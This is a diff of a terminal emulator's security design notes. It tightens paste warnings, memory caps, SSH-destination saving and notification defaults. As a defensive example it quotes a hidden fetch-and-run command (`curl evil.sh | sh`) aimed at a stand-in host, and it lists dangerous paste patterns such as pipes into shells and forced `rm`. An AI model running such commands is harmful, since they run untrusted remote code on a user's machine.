@@ -78,8 +78,8 @@ Copying a command from a web page where a hidden element appended
 `\ncurl evil.sh | sh\n` is a real and repeatedly exploited attack.
 
 - Bracketed paste is enabled by default.
-- When a paste contains a newline **and** the application has not enabled
-  bracketed paste mode, warn before sending (unless explicitly disabled).
+- When a paste contains a newline, warn before sending, whether or not the
+  child has claimed bracketed paste (unless explicitly disabled).
 - `paste-warning = dangerous` (default) also warns for pipes into shells
   (and the same feed through `bash <(…)` or `sh -c "$(curl …)"`),
   `sudo`, recursive forced `rm`, backslash-newline continuations and
@@ -101,13 +101,10 @@ Copying a command from a web page where a hidden element appended
   now off and it holds a newline, it is asked about again; it never goes
   unmarked unasked. The window between that last look and the child reading
   the bytes cannot be closed from here.
-- **Known limit.** `?2004` is set by output, and Corta cannot see who reads the
-  bytes. A remote host or program can print `ESC[?2004h` with nothing behind it
-  that understands the markers, such as an old line editor beyond `ssh`; a
-  multiline paste then takes no newline warning, and its newlines still run.
-  Warning on every multiline paste in a foreground program instead would ask
-  each time in Claude Code, vim and the like, whose bracketing is real, so it is
-  the user's choice: `paste-warning = always` warns on every multiline paste.
+- A newline warns even when the child claims `?2004`. Output can turn that
+  mode on with nothing behind it that treats the markers as data, such as an
+  old line editor beyond `ssh`. The pane's suppression checkbox still lasts
+  only for that pane; `paste-warning = off` is what disables the dialog.
 - A paste, like any other input, is bound to the session it was asked for. If
   that session has stopped, or the pane has a new one, by the time the warning
   is answered or the scan finishes, nothing is sent.
@@ -166,7 +163,7 @@ a user action naming a file the user chose, which is what typing is.
 through the exact funnel a ⌘V paste uses (`PaneCommands.insertAsPaste`):
 each dropped path is stripped of ESC and C0 control characters *before*
 quoting (`Paste.sanitized`), and the payload gets the §2.3 newline warning
-when the child has not enabled bracketed paste. A filename can contain a
+whether or not the child claims bracketed paste. A filename can contain a
 newline, so the earlier assumption that a dropped path never does is no
 longer relied on — quoting alone is not the whole defence.
 
@@ -410,10 +407,10 @@ allocating without bound. These caps are asserted in the fuzz harness
 | iTerm2 image OSC | File: base64 of at most 64 MiB decoded data plus 4100 header bytes, and never more than the pane/process image allowance left when the sequence begins (the parser asks before buffering); FilePart: 1 MiB per packet. A placement spans at most 4096 cells each way, as kitty's `c=`/`r=` do. Multipart total: at most 64 MiB decoded and the pane/process allowance. Unrelated OSC/CSI/APC abandons it; malformed base64, declared-size mismatch and oversized dimensions are dropped. The parser releases large string capacity after dispatch. Large base64 decoding uses the existing decode pause outside the session lock |
 | Extended clipboard / pointer stack | OSC 5522: 8192-byte packet cap, 3072 decoded bytes per text transaction, publish only at end; any invalid part discards it. Completed writes (5522 and OSC 52) wait in a queue of at most 8 for the app; past it the oldest is dropped and, if it was a 5522 write, answered `EIO`. Each 5522 write gets its own status. OSC 22: 16 fixed names per screen; oldest evicted, RIS clears both |
 | APC (Kitty graphics) chunk | 132 KiB — one `kitten icat` chunk plus its header; discard the sequence on overflow and resynchronise. A whole image is capped separately, as is a pane's image memory |
-| Kitty image memory         | 64 MB per image; 320 MB per pane across *both* screens (the alternate screen gets what the parked main screen left) with an unfinished transmission charged at its decoded size, and held until its last chunk, a delete command, a replacing transmission or RIS (other output between chunks ends nothing: the protocol's rule concerns graphics commands); 1 GB across every pane (`ImageMemoryBudget`, each session charged after every feed slice — exceeded by at most one image per session storing at the same instant). A decode outside the session's lock is charged its whole peak while it runs — text and decoded bytes, or decoded bytes and the inflate ceiling — and refused with `ENOSPC` when that does not fit, even if the image alone would. A 61 MiB raw image peaks at about 2.5× its size, down from 5.1× (`PERFORMANCE.md` §5.22) |
+| Kitty image memory         | 64 MB per image; 320 MB per pane across *both* screens (the alternate screen gets what the parked main screen left) with an unfinished transmission charged at its decoded size, and held until its last chunk, a delete command, a replacing transmission or RIS (other output between chunks ends nothing: the protocol's rule concerns graphics commands); 512 MB across every pane (`ImageMemoryBudget`, each session charged after every feed slice — exceeded by at most one image per session storing at the same instant). A decode outside the session's lock is charged its whole peak while it runs — text and decoded bytes, or decoded bytes and the inflate ceiling — and refused with `ENOSPC` when that does not fit, even if the image alone would. A 61 MiB raw image peaks at about 2.5× its size, down from 5.1× (`PERFORMANCE.md` §5.22) |
 | Kitty PNG / iTerm2 PNG and GIF-first-frame decoding | `corta-image-decoder`, a process of its own under the independent App Sandbox (no access to host user files or network entitlements), 10 s enforced by the app (SIGKILL, the image is not drawn) and 15 s by the helper's own `SIGALRM`, armed before it reads a byte, for a helper whose app has gone; a pixel mapping of at most the 16 M-pixel cap plus row-alignment padding, and an 8-byte stdout limit; the app re-checks the header's dimensions and the pixel count. The helper maps an inherited, immediately unlinked shared-memory descriptor inside its sandbox, so decoded pixels never travel over stdout |
 | Compressed Kitty image (`o=z`) | Inflates to exactly its declared pixels (RGB, RGBA) or at most the 64 MB image cap (PNG); the stream stops at the ceiling and the image is refused, so the expansion is never allocated. The zlib header and Adler-32 must check out; any other `o=` value is refused |
-| Pasted text | 64 MiB of UTF-8, refused before it is sanitised or scanned, with a notice. Scanned on the main thread below 64 KiB and off it above, where a newer paste replaces it. The write queue's 4 MiB is a back-pressure cap: it refuses a paste while a backlog is over it, and admits one paste whole |
+| Pasted text | 4 MiB of UTF-8, the write queue's cap less the bracket markers, refused before it is sanitised or scanned, with a notice. A short paste is scanned where it was asked for; a longer one is counted and scanned off the main thread, where a newer paste replaces it. The queue admits a write only when the whole of it fits the bytes still queued |
 | CSI parameter count        | 16 (xterm's limit); ignore the remainder               |
 | CSI parameter value        | Clamp to a sane maximum before use                     |
 | Repeat counts (`SU`, `SD`, `IL`, `DL`, `ICH`, `DCH`, `ECH`, `CHT`, `CBT`) | Clamp to the scroll region, line or tab margin; `REP` (`CSI b`) is not implemented and is ignored |
@@ -443,8 +440,8 @@ slow output pays that again each time it turns slow. The stream cannot run anyth
 or read anything this way. It makes the application slower to answer while it
 lasts, and it ends with the stream.
 
-**Known limit: the image ceilings are two.** The 1 GB across every pane counts
-decoded pixels; the textures drawn from them have a 1 GB budget of their own
+**Known limit: the image ceilings are two.** The 512 MB across every pane counts
+decoded pixels; the textures drawn from them have a 512 MB budget of their own
 (`GlobalTextureBudget`). Twelve panes of images reached both, a physical
 footprint of about 2 GB (`PERFORMANCE.md` §5.30).
 
@@ -740,12 +737,13 @@ keeps other accounts out. Directories Corta creates for state are `0700`, and a
 state file an older build left wider is tightened, its ACL cleared, as it loads.
 
 **Custom session restoration saves plaintext metadata, not terminal text.**
-`restore-windows` defaults to `true`. `state.json` can contain window geometry,
-split layout, focused pane, working directories, preset identifiers, launch
-metadata, and — for a pane the connect sheet opened over SSH — the destination
-(host, user, port, and the identity file's path; never the key's contents).
-Setting `restore-windows = false` disables restoration, and writes no
-destination: the state file is cleared instead. The file is
+`restore-windows` defaults to `true`. `restore-ssh-destinations` defaults to
+`false`. `state.json` can contain window geometry, split layout, focused pane,
+working directories, preset identifiers and launch metadata. The destination
+of a pane the connect sheet opened over SSH (host, user, port, and the identity
+file's path; never the key's contents) is written only when
+`restore-ssh-destinations` is on. Setting `restore-windows = false` disables
+restoration, and writes no destination: the state file is cleared instead. The file is
 owner-only (`0600`), as are `directory-history.json` and `recent-hosts.json`.
 Saved directories and host/preset metadata may themselves be sensitive.
 
@@ -756,8 +754,8 @@ policy switch for Corta's own JSON metadata.
 
 **Long-task notifications carry no terminal content.** They report only an
 outcome/duration beneath Corta's pane name, never OSC 0/2 text or commands.
-**Program notifications are an explicit exception:** when
-`notify-from-programs = true` (default), bounded OSC 9/777/99 title/body text
+**Program notifications are an explicit exception, and off by default:** when
+`notify-from-programs = true`, bounded OSC 9/777/99 title/body text
 can reach Notification Center, including the lock screen and its separate
 retention store. It is labelled as a pane message, stripped of controls and
 concealing scalars, capped at 2,048 UTF-8 bytes, coalesced into one mutable
